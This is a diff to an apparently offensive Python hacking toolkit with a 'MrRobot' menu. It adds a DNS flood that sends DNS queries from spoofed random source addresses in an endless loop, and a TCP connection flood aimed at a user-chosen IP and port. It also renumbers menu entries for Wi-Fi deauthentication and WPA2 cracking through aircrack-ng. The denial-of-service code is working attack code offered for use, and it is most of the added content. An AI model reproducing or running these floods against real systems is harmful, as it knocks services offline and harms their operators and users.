@@ -23,6 +23,7 @@ from time import sleep
 from ntplib import *
 from queue import Queue
 from playsound import playsound
+from vidstream import StreamingServer
 from colorama import Fore, Back, Style
 from cryptography.fernet import Fernet
 from scapy.all import *
@@ -2047,7 +2048,7 @@ while True:
         if menu_help == "4":
             try:
                 # The menu 
-                print("\n" + Fore.BLUE +  "[18] DDoS Menu" + "\n" +  Fore.BLUE + "[19] Request Flood" + "\n" + Fore.BLUE + "[20] SYN Flood Attack" + "\n" + Fore.BLUE + "[21] Udp Flood" + "\n"  + Fore.BLUE + "[22] Tcp Flood" + "\n" + Fore.BLUE + "[23] Ultra Web DDoS" + "\n" + Fore.BLUE + "[24] HTTP Flood Attack" + "\n" + Fore.BLUE + "[25] ICMP Flood" + "\n")
+                print("\n" + Fore.BLUE +  "[18] DDoS Menu" + "\n" +  Fore.BLUE + "[19] Request Flood" + "\n" + Fore.BLUE + "[20] SYN Flood Attack" + "\n" + Fore.BLUE + "[21] Udp Flood" + "\n"  + Fore.BLUE + "[22] Tcp Flood" + "\n" + Fore.BLUE + "[23] Ultra Web DDoS" + "\n" + Fore.BLUE + "[24] HTTP Flood Attack" + "\n" + Fore.BLUE + "[25] ICMP Flood" + "\n" + Fore.BLUE + "[26] DNS DDoS" + "\n" + Fore.BLUE + "[27] Tcp through flooding with denied connections" + "\n")
                 tool3 = input(Fore.GREEN + "MrRobot~# ")
 
                 if tool3 == "23":
@@ -6515,6 +6516,80 @@ while True:
 
                         except KeyboardInterrupt:
                             exit()
+                if tool3 =="26":
+                    try:
+                        print(
+                             """
+                             ____  _   _ ____    ____  ____       ____  
+                            |  _ \| \ | / ___|  |  _ \|  _ \  ___/ ___| 
+                            | | | |  \| \___ \  | | | | | | |/ _ \___ \   ~>DNS DDoS<~ 
+                            | |_| | |\  |___) | | |_| | |_| | (_) |__) | ~~>Made by tfwcodes(github)<~~
+                            |____/|_| \_|____/  |____/|____/ \___/____/ 
+                             """ + "\n"
+                        )
+
+                        dst_dns = input(Fore.GREEN + "[+] Enter the DNS destination: ")
+                        qname = input(Fore.GREEN + "[+] Enter the domain name: ")
+                        
+                        def deny():
+                            src = RandIP()
+                            packet_dns = IP(src=src, dst=dst_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
+                            send(packet_dns, loop=1)
+
+                        deny()
+                    except KeyboardInterrupt:
+                        exit()
+                if tool3 == "27":
+                    try:
+                        print(
+                            """
+                             _____            _____ _                 _ 
+                            |_   _|__ _ __   |  ___| | ___   ___   __| |
+                              | |/ __| '_ \  | |_  | |/ _ \ / _ \ / _` |  ~>Tcp Flood<~
+                              | | (__| |_) | |  _| | | (_) | (_) | (_| | ~~>Made by tfwcodes(github)<~~
+                              |_|\___| .__/  |_|   |_|\___/ \___/ \__,_|
+                                     |_|
+
+                            """
+                        )
+                        count = 0
+                        already_connected = 0
+
+                        
+                        def check_ip(ip):
+                            try:
+                                ipaddress.ip_address(ip)
+                                print("[+] The ip is valid")
+                            except:
+                                print("[-] The ip is invalid")
+                                input()
+                                break
+
+                        def flood(ip, port):
+                            global count
+                            global already_connected
+                            while True:
+                                try:
+                                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                    s.connect((ip, int(port)))
+                                    count+=1
+                                    already_connected +=1
+                                    print(f"Tcp Flood on {ip}:{port} [NUMBER OF CONNECTION] {count}")
+                                    if already_connected % 500 == 0:
+                                        sleep(1)
+                                except socket.timeout:
+                                    print(f"[SERVER DOWN] on {ip}:{port}")
+
+                        ip_to_flood = input(str(Fore.GREEN + "[+] Enter the target ip address: "))
+                        check_ip(ip_to_flood)
+                        port_to_flood = input(Fore.GREEN + "[+] Enter the target port: ")
+
+
+                        flood(ip_to_flood, port_to_flood)
+
+                    except KeyboardInterrupt:
+                        exit()
+
                 if tool3 == "25":
                     try:
                         print(
@@ -6586,10 +6661,10 @@ while True:
         if menu_help == "5":
             try:
                 while True:
-                    print("\n" + Fore.BLUE + "[26] Deauthentication Attack" + "\n" + Fore.BLUE + "[27] WPA2 Cracker"  )
+                    print("\n" + Fore.BLUE + "[28] Deauthentication Attack" + "\n" + Fore.BLUE + "[29] WPA2 Cracker" + "\n" + "[30]" )
                     print("\n" + Fore.BLUE + "[!!!] To run any tool from here you must run linux and also don't forget to run the program as sudo" + "\n")
                     acces_tool = input(Fore.GREEN + "MrRobot~# ")
-                    if acces_tool == "26":
+                    if acces_tool == "28":
                         if not 'SUDO_UID' in os.environ.keys():
                             print(Fore.BLUE + "[!] Please run the program as sudo")
                             exit()
@@ -6798,7 +6873,7 @@ while True:
                         except KeyboardInterrupt:
                             exit()
 
-                    if acces_tool == "26":
+                    if acces_tool == "29":
                         if not 'SUDO_UID' in os.environ.keys():
                             print(Fore.BLUE + "[!] Run the program as sudo")
                         print(
@@ -6841,8 +6916,7 @@ while True:
                                             dictionary2 = input(Fore.GREEN + "[+] Enter the dictionary path: ")  
                                             subprocess.run(["aircrack-ng", "hack1-01.cap", "-w", dictionary2])
                             except KeyboardInterrupt:
-                                exit()    
-            
+                                exit()         
             except KeyboardInterrupt:
                 exit()
 
